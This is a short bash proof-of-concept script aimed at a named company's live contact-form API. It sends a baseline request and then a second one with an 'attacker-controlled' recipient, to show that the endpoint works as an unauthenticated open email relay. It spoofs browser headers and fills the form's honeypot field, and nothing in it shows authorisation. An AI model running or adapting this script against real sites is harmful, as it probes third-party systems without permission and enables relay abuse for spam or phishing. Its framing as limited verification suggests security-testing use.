#!/bin/bash
# Independent verification of unauthenticated open email relay on POST /api/send
# Exactly 2 requests are sent: A = legitimate recipient (baseline), B = attacker-controlled recipient.
# Recipient chosen is a role-based address at the target's own domain (no third party is contacted).

BASE="https://www.infinitycapital.bh/api/send"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
STAMP=$(date -u +%Y%m%dT%H%M%SZ)

send () {   # $1=targets value  $2=label  $3=marker subject
  echo "----- REQUEST $2 -----"
  curl -s -i -X POST "$BASE" \
    -H "User-Agent: $UA" \
    -H "Referer: https://www.infinitycapital.bh/contact" \
    -H "Origin: https://www.infinitycapital.bh" \
    -F "fname=RelayVerify" \
    -F "lname=Tester" \
    -F "areacode=+973" \
    -F "tel=0000" \
    -F "cname=Security Verifier" \
    -F "subject=$3" \
    -F "msg=$2 relay proof - sent by independent security verification, please ignore." \
    -F "check=bot-filled-honeypot" \
    -F "targets=$1" \
    -w "\n[curl] http_code=%{http_code}\n"
  echo
}

echo "=== A: BASELINE - recipient = the site's own intended mailbox (info@infinitycapital.bh) ==="
send "info@infinitycapital.bh" "A-BASELINE" "VFY-A $STAMP"

echo "=== B: TEST - identical request, only the 'targets' field changed to a different address at the same domain ==="
send "abuse.desk@infinitycapital.bh" "B-ATTACKER-RECIPIENT" "VFY-B $STAMP"
